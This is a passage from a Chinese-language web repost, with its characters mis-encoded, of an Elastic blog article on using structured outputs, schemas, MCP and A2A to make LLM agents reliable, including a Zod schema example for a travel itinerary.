class="article-title" data-v-61fb5e44="">
            ä½¿ç”¨ Elasticsearch ä¸­çš„ç»“æ„åŒ–è¾“å‡ºåˆ›å»ºå¯é çš„ agents
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2612095360441448/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    Elasticsearch
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-30T00:36:58.000Z" title="Tue Dec 30 2025 00:36:58 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-30
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»13åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>ä½œè€…ï¼šæ¥è‡ª ElasticÂ <a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.elastic.co%2Fsearch-labs%2Fauthor%2Fjd-armada" title="https://www.elastic.co/search-labs/author/jd-armada" target="_blank" ref="nofollow noopener noreferrer">JD Armada</a></p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/05ad72fb058943fea4e380bf48185713~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgRWxhc3RpY3NlYXJjaA==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767659818&amp;x-signature=jEbZmrZkm7v7rYQfedK6hehyVnU%3D" alt="" loading="lazy"/></p>
<p>æ¢ç´¢ä»€ä¹ˆæ˜¯ç»“æ„åŒ–è¾“å‡º ï¼Œä»¥åŠå¦‚ä½•åœ¨ Elasticsearch ä¸­åˆ©ç”¨å®ƒä»¬ï¼Œå°† agents åŸºäºæœ€ç›¸å…³çš„ä¸Šä¸‹æ–‡è¿›è¡Œ grounding ï¼Œä»¥æ”¯æŒæ•°æ®å¥‘çº¦ ã€‚</p>
<p>ä½¿ç”¨ Elasticsearch äº²è‡ªåŠ¨æ‰‹å®è·µï¼šæ·±å…¥äº†è§£æˆ‘ä»¬çš„<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Felastic%2Felasticsearch-labs%3Ftab%3Dreadme-ov-file" title="https://github.com/elastic/elasticsearch-labs?tab=readme-ov-file" target="_blank" ref="nofollow noopener noreferrer">ç¤ºä¾‹ notebooks</a>ï¼Œå¼€å§‹<a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.elastic.co%2Fcloud%2Fcloud-trial-overview" title="https://www.elastic.co/cloud/cloud-trial-overview" target="_blank" ref="nofollow noopener noreferrer">å…è´¹çš„ cloud è¯•ç”¨</a>ï¼Œæˆ–è€…ç°åœ¨å°±åœ¨ä½ çš„<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Felastic%2Fstart-local" title="https://github.com/elastic/start-local" target="_blank" ref="nofollow noopener noreferrer">æœ¬åœ°æœºå™¨</a>ä¸Šè¯•ç”¨ Elasticã€‚</p>
<hr/>
<p>æˆ‘ä»¬æ­£åœ¨å¿«é€Ÿä»ç®€å•çš„ chatbots è¿‡æ¸¡åˆ°å¯ä»¥åœ¨ä½ çš„ç³»ç»Ÿä¸Šæ‰§è¡ŒçœŸå®ä¸”æœ‰å½±å“æ“ä½œçš„ agentsã€‚ä¸ºäº†ç¡®ä¿è¿™äº› agents å¯é ï¼Œæˆ‘ä»¬ä¸èƒ½å†åªä¾èµ–è‡ªç”±å½¢å¼çš„æ–‡æœ¬äº†ã€‚ç”Ÿæˆå¯é¢„æµ‹ã€æœºå™¨å¯è¯»è¾“å‡ºçš„èƒ½åŠ›ï¼Œå·²ç»æˆä¸ºæ„å»ºå¯é  AI agents çš„ä¸€ä¸ªé‡è¦å±‚ã€‚Structured outputs ä¹Ÿæ˜¯ context engineering ä¸­çš„å…³é”®ä¸€å±‚ï¼Œcontext engineering æ˜¯ä¸€ç»„ç­–ç•¥ï¼Œç”¨æ¥ç¡®ä¿ LLMs åŸºäºä¸ä»»åŠ¡æœ€ç›¸å…³çš„ä¿¡æ¯ã€‚ç»“åˆåœ¨ä¸€èµ·ï¼Œè¿™äº›æ¨¡å¼å¯ä»¥æŠŠ LLMs ä»ç®€å•çš„å¯¹è¯å·¥å…·ï¼Œè½¬å˜ä¸ºä½ å¯ä»¥å®‰å…¨é›†æˆåˆ°æ›´å¤§ç³»ç»Ÿä¸­çš„å¯é ç»„ä»¶ã€‚åœ¨è¿™ç¯‡æ–‡ç« ä¸­ï¼Œæˆ‘ä»¬å°†ä»‹ç»ä»€ä¹ˆæ˜¯ structured outputsï¼Œä»¥åŠå¦‚ä½•åˆ©ç”¨å®ƒä»¬æ¥æä¾›ç¬¦åˆå…³é”® contracts çš„å¯é è¾“å‡ºã€‚å¦‚æœä½ åˆšæ¥è§¦ context engineeringï¼Œå¯ä»¥æŸ¥çœ‹æˆ‘ä»¬è¿™é‡Œçš„<a href="https://link.juejin.cn?target=https%3A%2F%2Felasticstack.blog.csdn.net%2Farticle%2Fdetails%2F151232162" title="https://elasticstack.blog.csdn.net/article/details/151232162" target="_blank" ref="nofollow noopener noreferrer">æ–‡ç« </a>ã€‚</p>
<h2 data-id="heading-0">Structured outputs</h2>
<p>Structured outputs æ˜¯ç¬¦åˆé¢„å®šä¹‰ schema æˆ–æ•°æ®ç»“æ„çš„ LLM å“åº”ï¼Œè€Œä¸æ˜¯è‡ªç”±å½¢å¼çš„æ–‡æœ¬ã€‚å¼€å‘è€…ä¸å†æ¥æ”¶ä¸å¯é¢„æµ‹çš„å“åº”ï¼Œè€Œæ˜¯å¯ä»¥æ˜ç¡®æŒ‡å®šå“åº”åº”è¯¥å¦‚ä½•æ ¼å¼åŒ–ã€‚</p>
<p>åœ¨ä¸‹é¢çš„ç¤ºä¾‹ä¸­ï¼Œå¦‚æœä½ è®©ä¸€ä¸ª LLM è®¿é—®ä½ åœ¨ Elasticsearch ä¸­çš„ indicesï¼Œå¹¶è¦æ±‚å®ƒ â€œåˆ†æè¿™ä¸ª Elasticsearch indexâ€ï¼Œå®ƒå¾ˆå¯èƒ½ä¼šè¿”å›ä¸€æ®µå™è¿°æ€§çš„è§£é‡Šï¼Œè€Œä¸”æ¯æ¬¡ä½ ç”¨ç›¸åŒçš„ prompt è¯¢é—®ï¼Œç»“æœéƒ½ä¼šå˜åŒ–ã€‚ä½¿ç”¨ structured outputsï¼Œä½ å¯ä»¥è¯·æ±‚ä¸€ä¸ªåŒ…å«ç‰¹å®šå­—æ®µçš„å“åº”ï¼Œæ¯”å¦‚ indexNameã€documentCountã€healthStatus ç­‰ï¼Œæ¯ä¸ªå­—æ®µéƒ½æœ‰å®šä¹‰å¥½çš„ç±»å‹å’Œæ ¡éªŒè§„åˆ™ã€‚</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/e3c0aa8b2b404de98f10afaad011257e~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgRWxhc3RpY3NlYXJjaA==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767659818&amp;x-signature=3ITdd9gq6MxFVKtbdPJAvWKlkBI%3D" alt="" loading="lazy"/></p>
<p>å³ä¾§çš„ç»“æ„åŒ–æ ¼å¼å¯ä»¥ç«‹å³ é’ˆå¯¹ ä¸€ä¸ª schema è¿›è¡Œ éªŒè¯ï¼Œ è€Œ ä¸éœ€è¦é¢å¤–æ·»åŠ è§£ææ–‡æœ¬çš„æ­¥éª¤ã€‚</p>
<p>ä¸»è¦çš„æ¨¡å‹æä¾›å•†æ­£åœ¨è¿…é€Ÿæ³¨æ„åˆ°ç»“æ„åŒ–è¾“å‡ºå˜å¾—å¤šä¹ˆé‡è¦ï¼Œ<a href="https://link.juejin.cn?target=https%3A%2F%2Fblog.google%2Ftechnology%2Fdevelopers%2Fgemini-api-structured-outputs%2F" title="https://blog.google/technology/developers/gemini-api-structured-outputs/" target="_blank" ref="nofollow noopener noreferrer">Google</a>ã€<a href="https://link.juejin.cn?target=https%3A%2F%2Fopenai.com%2Findex%2Fintroducing-structured-outputs-in-the-api%2F" title="https://openai.com/index/introducing-structured-outputs-in-the-api/" target="_blank" ref="nofollow noopener noreferrer">OpenAI</a> å’Œ <a href="https://link.juejin.cn?target=https%3A%2F%2Fplatform.claude.com%2Fdocs%2Fen%2Fbuild-with-claude%2Fstructured-outputs" title="https://platform.claude.com/docs/en/build-with-claude/structured-outputs" target="_blank" ref="nofollow noopener noreferrer">Anthropic</a> éƒ½å·²ç»åœ¨å„è‡ªçš„ API ä¸­å‘å¸ƒäº†å¯¹ç»“æ„åŒ–è¾“å‡ºçš„æ”¯æŒã€‚OpenAI æ›´è¿›ä¸€æ­¥ï¼Œå‘å¸ƒäº†ç»è¿‡ä¸“é—¨è®­ç»ƒçš„æ–°æ¨¡å‹ï¼Œèƒ½å¤Ÿæ›´å¥½åœ°ç†è§£å¹¶éµå¾ªå¤æ‚çš„ schemaã€‚ä¸‹é¢æ˜¯ OpenAI å¯¹å…¶æ¨¡å‹åœ¨éµå¾ªå¤æ‚ JSON schema æ–¹é¢è¡¨ç°çš„è¯„ä¼°ã€‚</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/014d1a4e1f714ff988e49adeacef5008~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgRWxhc3RpY3NlYXJjaA==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767659818&amp;x-signature=hgcKeZx%2BiT9ziwiF44tAJAYm4tQ%3D" alt="" loading="lazy"/> <a href="https://link.juejin.cn?target=https%3A%2F%2Fopenai.com%2Findex%2Fintroducing-structured-outputs-in-the-api%2F" title="https://openai.com/index/introducing-structured-outputs-in-the-api/" target="_blank" ref="nofollow noopener noreferrer">openai.com/index/introâ€¦</a></p>
<h2 data-id="heading-1">è¿™å¦‚ä½•å½±å“å¤šæ™ºèƒ½ä½“ç³»ç»Ÿ</h2>
<p>æƒ³è±¡ä¸€ä¸ªåœºæ™¯ï¼šä¸€ç»„æ™ºèƒ½ä½“åœ¨å½¼æ­¤ä¹‹é—´ä¼ é€’éç»“æ„åŒ–çš„è‡ªç”±æ–‡æœ¬æ•°æ®ã€‚æ¯ä¸ªæ™ºèƒ½ä½“éƒ½éœ€è¦è‡ªå®šä¹‰è§£æé€»è¾‘æ¥ç†è§£å…¶ä»–æ™ºèƒ½ä½“çš„å“åº”ï¼Œè¿™ä¸ä»…ä¼šå¢åŠ  token ä½¿ç”¨é‡ï¼Œè€Œä¸”åœ¨å®é™…ä¸­å‡ ä¹è‚¯å®šä¼šå‡ºé—®é¢˜ã€‚å†åŠ ä¸Š LLM çš„è¾“å‡ºæ˜¯æ¦‚ç‡æ€§çš„ï¼Œå› æ­¤ä¸å¯é¢„æµ‹ã€‚æˆ‘ä»¬å¦‚ä½•èƒ½ä¿¡ä»»è¿™ç§ç³»ç»Ÿå»å¯¹æˆ‘ä»¬çš„ç³»ç»Ÿæ‰§è¡ŒçœŸå®ã€æœ‰å½±å“çš„æ“ä½œï¼Ÿç»“æ„åŒ–è¾“å‡ºåœ¨æ™ºèƒ½ä½“ä¹‹é—´å®šä¹‰äº†ä¸€ä¸ªå¥‘çº¦ï¼Œç”¨å¯é ã€å¯é¢„æµ‹çš„è¡Œä¸ºå–ä»£äº†æ­§ä¹‰ã€‚</p>
<h2 data-id="heading-2">AI æ™ºèƒ½ä½“ä¸ MCP ä¸­æ ‡å‡†åŒ–çš„é‡è¦æ€§</h2>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.openapis.org%2F" title="https://www.openapis.org/" target="_blank" ref="nofollow noopener noreferrer">OpenAPI</a> é€šè¿‡ä¸ºå¼€å‘è€…æä¾›ä¸€ç§å…±äº«ä¸”å¯é¢„æµ‹çš„æ–¹å¼æ¥æè¿°ç«¯ç‚¹ã€å‚æ•°å’Œå“åº”ï¼Œå½»åº•æ”¹å˜äº† REST API å¼€å‘ã€‚ç»“æ„åŒ–è¾“å‡ºæŠŠåŒæ ·çš„ç†å¿µå¸¦åˆ°äº† AI æ™ºèƒ½ä½“é¢†åŸŸï¼Œé€šè¿‡æä¾›å¥‘çº¦æ¥æ ‡å‡†åŒ–æ™ºèƒ½ä½“ä¸ç³»ç»Ÿä¹‹é—´çš„æ•°æ®äº¤æ¢æ–¹å¼ã€‚</p>
<p>è¿™äº›å¥‘çº¦ç¡®ä¿äº†ï¼š</p>
<ul>
<li><strong>ä¸‹æ¸¸ç³»ç»Ÿå¯ä»¥å¯é åœ°è§£æå“åº”</strong>ï¼šå½“ä¸€ä¸ªæ™ºèƒ½ä½“éœ€è¦æ‰§è¡Œè¯¸å¦‚æ›´æ–°æ•°æ®åº“ã€è°ƒç”¨ API æˆ–è§¦å‘å·¥ä½œæµä¹‹ç±»çš„æ“ä½œæ—¶ï¼Œæ¥æ”¶ç³»ç»Ÿå¿…é¡»èƒ½å¤Ÿä¿¡ä»»æ•°æ®çš„ç»“æ„å’Œå®Œæ•´æ€§ã€‚</li>
<li><strong>ç±»å‹å®‰å…¨å¾—ä»¥ä¿æŒ</strong>ï¼šç»“æ„åŒ–è¾“å‡ºæ”¯æŒç¼–è¯‘æœŸæˆ–è¿è¡Œæ—¶æ ¡éªŒï¼Œåœ¨é”™è¯¯æ‰©æ•£åˆ°æ•´ä¸ªç³»ç»Ÿå¹¶æ¼”å˜æˆæ›´å¤§é—®é¢˜ä¹‹å‰å°±å°†å…¶æ•è·ã€‚</li>
<li><strong>é›†æˆæ˜¯å¯é¢„æµ‹çš„</strong>ï¼šæœ‰äº†æ˜ç¡®çš„ schemaï¼ŒæŠŠæ™ºèƒ½ä½“é›†æˆåˆ°ç°æœ‰åŸºç¡€è®¾æ–½ä¸­å¯ä»¥éµå¾ªå¼€å‘è€…åœ¨ä¼ ç»Ÿ API å¼€å‘ä¸­å·²ç»ç†Ÿæ‚‰çš„æ¨¡å¼ã€‚</li>
<li><strong>å¤šæ™ºèƒ½ä½“ç³»ç»Ÿå¯ä»¥å½¼æ­¤ç†è§£</strong>ï¼šå½“å¤šä¸ªæ™ºèƒ½ä½“éœ€è¦åä½œæ—¶ï¼Œç»“æ„åŒ–è¾“å‡ºæä¾›äº†ä¸€ç§é€šç”¨è¯­è¨€æ¥äº¤æ¢ä¿¡æ¯ã€‚</li>
</ul>
<p>æ¨¡å‹ä¸Šä¸‹æ–‡åè®®ï¼ˆ <a href="https://link.juejin.cn?target=https%3A%2F%2Fmodelcontextprotocol.io%2Fdocs%2Fgetting-started%2Fintro" title="https://modelcontextprotocol.io/docs/getting-started/intro" target="_blank" ref="nofollow noopener noreferrer">MCP</a> ï¼‰åœ¨æ­¤åŸºç¡€ä¸Šè¿›ä¸€æ­¥æ ‡å‡†åŒ–äº†æ™ºèƒ½ä½“åœ¨æ¨¡å‹ã€å·¥å…·å’Œåº”ç”¨ä¹‹é—´äº¤æ¢ä¸Šä¸‹æ–‡çš„æ–¹å¼ã€‚å½“æ™ºèƒ½ä½“é€šè¿‡ MCP é€šä¿¡æ—¶ï¼Œç»“æ„åŒ–è¾“å‡ºç¡®ä¿è¢«å…±äº«çš„ä¸Šä¸‹æ–‡åœ¨ä¸åŒç³»ç»Ÿä¹‹é—´ä¿æŒå…¶ç»“æ„ã€‚</p>
<p>MCP è´Ÿè´£ä¸Šä¸‹æ–‡çš„ä¼ è¾“å’Œç”Ÿå‘½å‘¨æœŸï¼Œè€Œç»“æ„åŒ–è¾“å‡ºå®šä¹‰äº†ä¸Šä¸‹æ–‡ä¸­æ•°æ®çš„å½¢çŠ¶å’Œçº¦æŸã€‚</p>
<p>å®ƒä»¬ç»“åˆåœ¨ä¸€èµ·ï¼Œä½¿å¾—ï¼š</p>
<ul>
<li>å¯ç»„åˆçš„æ™ºèƒ½ä½“å¯ä»¥è¢«å¤ç”¨æˆ–æ›¿æ¢</li>
<li>æ¨¡å‹ã€å·¥å…·å’Œåº”ç”¨ä¹‹é—´æœ‰æ¸…æ™°çš„å¥‘çº¦</li>
<li>æ›´å¯é çš„è‡ªåŠ¨åŒ–ï¼Œå°¤å…¶æ˜¯åœ¨éœ€è¦æ™ºèƒ½ä½“è§¦å‘ç°å®ä¸–ç•Œæ“ä½œæ—¶</li>
<li>å¯æ‰©å±•çš„å¤šæ™ºèƒ½ä½“æ¶æ„</li>
</ul>
<p>å…¶ä»–æ–°å…´åè®®ï¼Œä¾‹å¦‚ <a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fa2aproject%2FA2A" title="https://github.com/a2aproject/A2A" target="_blank" ref="nofollow noopener noreferrer">agent-to-agent</a> ( A2A ) åè®®ï¼Œä¹ŸåŒæ ·å¼ºè°ƒ schema å’Œå¥‘çº¦ï¼Œä»¥å®ç°æ™ºèƒ½ä½“ä¹‹é—´ç›´æ¥ã€å¯é çš„é€šä¿¡ã€‚</p>
<p>MCP ä»¥åŠåƒ A2A è¿™æ ·çš„åè®®ï¼ŒåŠ ä¸Šç»“æ„åŒ–è¾“å‡ºï¼Œç»™ AI ç³»ç»Ÿå¸¦æ¥äº†å½“å¹´ OpenAPI ä¹‹äºå¾®æœåŠ¡çš„ä»·å€¼ â€”â€” ä¸€ä¸ªå…±äº«çš„å¥‘çº¦ï¼ŒæŠŠä¸´æ—¶æ‹¼å‡‘çš„é›†æˆè½¬å˜ä¸ºå¯é çš„ç³»ç»Ÿã€‚</p>
<h2 data-id="heading-3">åˆ›å»º schema çš„æŠ€æœ¯</h2>
<p>ç°åœ¨ï¼Œæˆ‘ä»¬å¦‚ä½•çœŸæ­£å®ç° ç»“æ„åŒ–è¾“å‡º å‘¢ï¼Ÿå¹¸è¿çš„æ˜¯ï¼Œåƒ Python å’Œ JavaScript è¿™æ ·çš„ä¸»æµç”Ÿæ€ç³»ç»Ÿå·²ç»æœ‰äº†æˆç†Ÿçš„ schema å’Œæ ¡éªŒåº“ï¼Œå¯ä»¥è®©å®ç° ç»“æ„åŒ–è¾“å‡º å˜å¾—æ›´ç®€å•ã€‚ä½ ä»Šå¤©å°±å¯ä»¥ä½¿ç”¨è¿™äº›å·¥å…·æ¥æ§åˆ¶ LLM è¿”å›çš„æ•°æ®ç»“æ„ï¼Œåœ¨è¿è¡Œæ—¶è¿›è¡Œæ ¡éªŒï¼Œæˆ–è€…åœ¨æ¨¡å‹äº§ç”Ÿå¹»è§‰æ—¶ç›´æ¥æ‹’ç»ç»“æœã€‚åœ¨è¿™ä¸€èŠ‚ä¸­ï¼Œæˆ‘ä»¬ä¼šçœ‹çœ‹å¼€å‘è€…æœ€å¸¸ç”¨çš„ä¸€äº›å·¥å…·ï¼Œä»¥åŠå®ƒä»¬åœ¨åº•å±‚æ˜¯å¦‚ä½•å·¥ä½œçš„ã€‚</p>
<h3 data-id="heading-4">Zod å’Œ JavaScript ç”Ÿæ€</h3>
<p>åœ¨ JavaScript å’Œ TypeScript é¢†åŸŸï¼Œ<a href="https://link.juejin.cn?target=https%3A%2F%2Fzod.dev%2F" title="https://zod.dev/" target="_blank" ref="nofollow noopener noreferrer">Zod</a> å·²ç»æˆä¸º schema å®šä¹‰å’Œæ ¡éªŒçš„é¦–é€‰åº“ï¼Œå› ä¸ºå®ƒé«˜æ•ˆã€æ˜“ç”¨ï¼Œå¹¶ä¸”èƒ½å¾ˆå¥½åœ°é›†æˆåˆ°åƒ Vercel çš„ <a href="https://link.juejin.cn?target=https%3A%2F%2Fai-sdk.dev%2F" title="https://ai-sdk.dev/" target="_blank" ref="nofollow noopener noreferrer">AI SDK</a> å’Œ <a href="https://link.juejin.cn?target=https%3A%2F%2Fmastra.ai%2F" title="https://mastra.ai/" target="_blank" ref="nofollow noopener noreferrer">Mastra</a> è¿™æ ·çš„ AI ç¼–æ’æ¡†æ¶ä¸­ã€‚ä¸ºäº†ç›´è§‚å±•ç¤ºè¿™ä¸€ç‚¹ï¼Œæˆ‘ä»¬æ¥çœ‹æˆ‘åŒäº‹ <a href="https://link.juejin.cn?target=https%3A%2F%2Felasticstack.blog.csdn.net%2Farticle%2Fdetails%2F151232162" title="https://elasticstack.blog.csdn.net/article/details/151232162" target="_blank" ref="nofollow noopener noreferrer">Carly çš„ç¤ºä¾‹</a>ã€‚Carly ä½¿ç”¨ Zod æ­é… AI SDK åˆ›å»ºäº†ä¸€ä¸ª schemaï¼Œå¼ºåˆ¶ LLM ä»¥ç»è¿‡æ ¡éªŒã€ç±»å‹å®‰å…¨çš„æ ¼å¼è¿”å›è¡Œç¨‹æ•°æ®ã€‚</p>
<p>ä¸‹é¢çš„ schema åšäº† 3 ä»¶äº‹ï¼š</p>
<ol>
<li>ç¡®ä¿ LLM è¿”å›çš„æ˜¯åˆæ³•çš„ JSONã€‚</li>
<li>ç¡®ä¿æ•°æ®å…·æœ‰æ­£ç¡®çš„ç±»å‹ã€çº¦æŸå’ŒåµŒå¥—ç»“æ„ã€‚</li>
<li>ç”Ÿæˆå¯ä»¥ç›´æ¥ç”¨äºåº”ç”¨çš„æ•°æ®ï¼Œä¸éœ€è¦é¢å¤–å¤„ç†ã€‚</li>
</ol>

<pre><code class="hljs language-css" lang="css">`

<span class="hljs-number">1</span>.  import { generateObject } <span class="hljs-selector-tag">from</span> 'ai';
<span class="hljs-number">2</span>.  import { z } <span class="hljs-selector-tag">from</span> 'zod';
<span class="hljs-number">3</span>.  const { <span class="hljs-selector-tag">object</span> } = await generateObject({
<span class="hljs-number">4</span>.   model: <span class="hljs-string">'openai/gpt-4.1'</span>,
<span class="hljs-number">5</span>.   schemaName: <span class="hljs-string">'Travel Itinerary'</span>,
<span class="hljs-number">6</span>.   schemaDescription: <span class="hljs-string">'Sample travel itinerary for a trip'</span>,
<span class="hljs-number">7</span>.   schema: z.<span class="hljs-built_in">object</span>({
<span class="hljs-number">8</span>.     title: z.<span class="hljs-built_in">string</span>(),
<span class="hljs-number">9</span>.     location: z.<span class="hljs-built_in">string</span>(),
<span class="hljs-number">10</span>.     hotel: z.<span class="hljs-built_in">object</span>({name: z.<span class="hljs-built_in">string</span>(), roomType: z.<span class="hljs-built_in">string</span>(), amount: z.<span class="hljs-built_in">number</span>(), checkin: z.iso.<span class="hljs-built_in">date</span>(), checkout: z.iso.<span class="hljs-built_in">date</span>()}),
<span class="hljs-number">11</span>.     flights: z.<span class="hljs-built_in">array</span>(z.<span class="hljs-built_in">object</span>({carrier: z.<span class="hljs-built_in">string</span>(), flightNo: z.<span class="hljs-built_in">string</span>().<span class="hljs-built_in">max</span>(<span class="hljs-number">8</span>), origin: z.<span class="hljs-built_in">string</span>(), destination: z.<span class="hljs-built_in">string</span>(), date: z.iso.<span class="hljs-built_in">datetime</span>()})),
<span class="hljs-number">12</span>.     excursions: z.<span class="hljs-built_in">array</span>(z.<span class="hljs-built_in">object</span>({ name: z.<span class="hljs-built_in">string</span>(), amount: z.<span class="hljs-built_in">number</span>(), date: z.iso.<span class="hljs-built_in">datetime</span>()}))
<span class="hljs-number">13</span>.   }),
<span class="hljs-number">14</span>.   prompt: <span class="hljs-string">'Generate a travel itinerary based on the specified location'</span>,
<span class="hljs-number">15</span>.  });

`AIå†™ä»£ç !<span class="hljs-selector-attr">[]</span>(https://csdnimg.cn/release/blogv2/dist/pc/img/runCode/icon-arrowwhite.png)
</code></pre>
<p>è®©æˆ‘ä»¬æ›´ä»”ç»†åœ°çœ‹çœ‹è¿™ä¸ª schema ä¸­çš„é‡è¦éƒ¨åˆ†ã€‚</p>
<p><strong>è¡Œç¨‹ä¿¡æ¯</strong></p>
<pre><code class="hljs language-css" lang="css">`

<span class="hljs-number">1</span>.  schema: z.<span class="hljs-built_in">object</span>({
<span class="hljs-number">2</span>.    title: z.<span class="hljs-built_in">string</span>(),
<span class="hljs-number">3</span>.    location: z.<span class="hljs-built_in">string</span>(),

`AIå†™ä»£ç 
</code></pre>
<p>ä¸Šé¢çš„è¿™äº›å­—æ®µæ˜¯ç®€å•çš„å­—ç¬¦ä¸²ï¼Œä½†æˆ‘ä»¬å¯ä»¥å¾—å‡ºçš„ç»“è®ºæ˜¯ï¼ŒLLM ä¸èƒ½éšæ„ç¼–é€ ç»“æ„ã€‚å­—æ®µ title å’Œ location å¿…é¡»åŒ…å«ï¼Œè€Œä¸”å®ƒä»¬å¿…é¡»æ˜¯å­—ç¬¦ä¸²ï¼Œå¦åˆ™å“åº”ä¼šè¢«æ‹’ç»ã€‚</p>
<p><strong>é…’åº—è¯¦æƒ…</strong></p>
<pre><code class="hljs language-css" lang="css">`

<span class="hljs-number">1</span>.  hotel: z.<span class="hljs-built_in">object</span>({ 
<span class="hljs-number">2</span>.    name: z.<span class="hljs-built_in">string</span>(), 
